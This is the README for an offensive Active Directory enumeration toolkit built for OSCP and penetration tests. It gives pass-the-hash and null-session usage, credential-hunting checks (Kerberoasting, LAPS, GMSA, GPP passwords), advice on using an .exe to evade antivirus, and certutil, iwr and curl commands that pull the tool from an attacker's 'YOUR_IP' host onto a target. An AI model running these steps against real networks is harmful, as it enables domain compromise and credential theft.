```
    __  ____  _______ __ ____  __
   / / / / / / / ___// //_/\ \ \/ /
  / /_/ / / / /\__ \/ ,<    \  /
 / __  / /_/ /___/ / /| |   / /
/_/ /_/\____//____/_/ |_|  /_/
    __  _____   ________ __ __________
   / / / /   | / ____/ //_// ____/ __ \
  / /_/ / /| |/ /   / ,<  / __/ / /_/ /
 / __  / ___ / /___/ /| |/ /___/ _, _/
/_/ /_/_/  |_\____/_/ |_/_____/_/ |_|
```

# husky-ad

**Active Directory Enumeration & Escalation Toolkit**
*No modules. No Metasploit. Just results.*

Built by [The Husky Hacker](https://thehuskyhacker.com) — designed for the OSCP exam and real-world AD engagements.

---

## What Is This?

husky-ad is a zero-dependency AD enumeration script that runs on any foothold — Linux attack box or domain-joined Windows host. It checks everything you need for AD privilege escalation and flags findings with severity levels so you know what to hit first.

Built from real Proving Grounds and OSCP lab chains: Hokkaido, Access-AD, Compromised-AD, Nagoya, Secura, Hutch, Labs A/B/C/D, Medtech.

## Three Formats

| File | Platform | Requirements |
|------|----------|-------------|
| `husky-ad.sh` | Linux (Kali/Parrot) | ldapsearch, netexec, rpcclient, impacket |
| `husky-ad.ps1` | Windows (domain-joined) | PowerShell 5.1+ (no modules needed) |
| `husky-ad.exe` | Windows | .NET 8 runtime + PowerShell |

The **bash version** uses standard Kali tools (ldapsearch, netexec, rpcclient, impacket, bloodyAD). Run from your attack box.

The **PowerShell version** uses native .NET `DirectorySearcher` — no RSAT, no PowerView, no imported modules. Drop it on any domain-joined Windows host and run. Ideal for situations where you have a shell but can't import modules.

The **exe** is the PowerShell script compiled into a standalone executable. It embeds the full .ps1, extracts and runs it at runtime. Useful for AV-light drops where `.ps1` extension gets flagged but a .exe slips through.

## Quick Start

### Linux (from Kali)
```bash
chmod +x husky-ad.sh

# Authenticated
./husky-ad.sh -d corp.local -c 10.10.10.10 -u jsmith -p 'Password123!'

# Pass-the-hash
./husky-ad.sh -d corp.local -c 10.10.10.10 -u admin -H aad3b435b51404eeaad3b435b51404ee

# Null session
./husky-ad.sh -d corp.local -c 10.10.10.10
```

### Windows (PowerShell)
```powershell
# Auto-detect domain (run as domain user)
.\husky-ad.ps1

# Specify target DC
.\husky-ad.ps1 -DomainController 10.10.10.10 -Domain corp.local

# Full mode (extended checks, slower)
.\husky-ad.ps1 -Full

# Quick mode (critical checks only)
.\husky-ad.ps1 -Quick

# Custom output directory
.\husky-ad.ps1 -Full -OutputDir C:\Temp\loot
```

### Compiled EXE
```cmd
husky-ad.exe -Full -OutputDir C:\Temp\loot
```
All PowerShell parameters pass through as-is.

## What It Checks

### Enumeration Modules

| # | Section | What It Does |
|---|---------|-------------|
| 1 | **Sniffing the Territory** | Domain info, naming contexts, functional level, null session test |
| 2 | **Testing the Fence** | Password policy — lockout threshold, complexity, min length |
| 3 | **Tracking the Pack** | User enumeration — descriptions (password hunting), admin accounts, account status |
| 4 | **Cracking Bones** | AS-REP Roastable users (no preauth), Kerberoastable service accounts (SPNs) |
| 5 | **Finding the Weak Link** | Delegation — unconstrained, constrained, RBCD; ACL abuse paths |
| 6 | **Raiding the Den** | SMB shares — readable shares, SYSVOL scripts, GPP cPassword extraction |
| 7 | **Digging Up Bones** | LAPS v1 (`ms-Mcs-AdmPwd`) and v2 (`msLAPS-Password`) recovery |
| 8 | **Buried Treasure** | GMSA account passwords (`msDS-GroupMSAMembership`) |
| 9 | **The Alpha Dogs** | Privileged group membership — Domain Admins, Enterprise Admins, Schema Admins, Backup Operators, DnsAdmins, Account Operators, GPO Creators |
| 10 | **Mapping the Territory** | Computer enumeration, legacy OS detection (Server 2008/2003, Win7), MachineAccountQuota |
| 11 | **Neighboring Packs** | Domain/forest trusts, trust direction and type |
| 12 | **Sniffing Policy** | GPO enumeration, GPP password hunting in SYSVOL |
| 13 | **Howling at DNS** | Zone transfer attempts, ADIDNS dumps |

### Extended Checks (`-Full` / `--full`)

| Check | What It Detects |
|-------|----------------|
| **Service Access** | MSSQL instances, RDP availability, WinRM |
| **EternalBlue** | MS17-010 vulnerable hosts |
| **NTLMv1** | Hosts allowing NTLMv1 (relay attacks) |
| **Print Spooler** | Spooler service running (PrintNightmare/coercion) |
| **WebDAV** | WebClient service (NTLM relay via coercion) |
| **BloodHound** | Automated collection via bloodhound-python (bash) |

### Windows-Only Checks (PowerShell)

| Check | What It Detects |
|-------|----------------|
| **Token Privileges** | SeImpersonatePrivilege (potato attacks), SeBackupPrivilege, SeDebugPrivilege |
| **LSA Protection** | RunAsPPL enabled (blocks credential dumping) |
| **Credential Guard** | VBS credential isolation active |
| **AppLocker** | Application whitelisting rules in effect |
| **Defender / AMSI** | AV status, real-time monitoring, AMSI provider |
| **Port Scan** | Quick scan of DC for common services (LDAP, SMB, Kerberos, MSSQL, WinRM, RDP) |

## Output Tags

Every finding is tagged with severity:

| Tag | Meaning |
|-----|---------|
| `[SNIFF]` | Informational finding — noted for context |
| `[GROWL]` | Warning — worth investigating |
| `[BITE!]` | Critical — immediate escalation path |
| `[TRACK]` | Info — general enumeration data |
| `[WHIFF]` | Check failed or returned nothing |

## The Hunt Report

At the end of every run, husky-ad prints a summary:

- **KILLS** — Critical findings (instant escalation paths)
- **EASY PREY** — Quick wins (low-effort attacks)
- **SCENT TRAIL** — Important findings worth investigating

Plus suggested next steps based on what was found.

## Output Directory

All raw output is saved to `./husky_ad_loot/` (configurable):

```
husky_ad_loot/
├── domain_info.txt
├── users.txt
├── user_descriptions.txt
├── kerberoast_targets.txt
├── asrep_targets.txt
├── shares.txt
├── laps_passwords.txt
├── gmsa_accounts.txt
├── privileged_groups.txt
├── computers.txt
├── trusts.txt
├── gpos.txt
├── dns_zone.txt
└── bloodhound/          # (if collected)
```

## OSCP Notes

- **Zero Metasploit** — everything uses allowed tools
- **Zero modules** — the PowerShell version uses only native .NET classes
- **Exam safe** — nothing here violates OSCP restrictions
- **Lab-tested** — built from real PG Practice and OSCP lab AD sets

## Dependencies

### Bash Version (Kali)
All pre-installed on Kali:
- `ldapsearch` — LDAP queries
- `netexec` (nxc) — SMB, shares, GPP
- `rpcclient` — RPC enumeration
- `impacket` — GetNPUsers, GetUserSPNs, secretsdump
- `bloodyAD` — ACL and delegation checks
- `bloodhound-python` — BloodHound collection (optional, `-Full` mode)

### PowerShell Version
- PowerShell 5.1+ (built into Windows)
- Domain-joined machine (or credentials)
- That's it. No modules.

```
# From Kali - python HTTP server
python3 -m http.server 80

# On target - download
certutil -urlcache -split -f http://YOUR_IP/husky-ad.exe husky-ad.exe
# or
powershell -c "iwr http://YOUR_IP/husky-ad.exe -OutFile husky-ad.exe"
# or
curl http://YOUR_IP/husky-ad.exe -o husky-ad.exe
```
## Author

**The Husky Hacker**
- GitHub: [github.com/HackingHusky](https://github.com/HackingHusky)
- Site: [thehuskyhacker.com](https://thehuskyhacker.com)
- Blog: [husky-hacker-read.com](https://husky-hacker-read.com)

*"The domain is a forest. Be the wolf."*
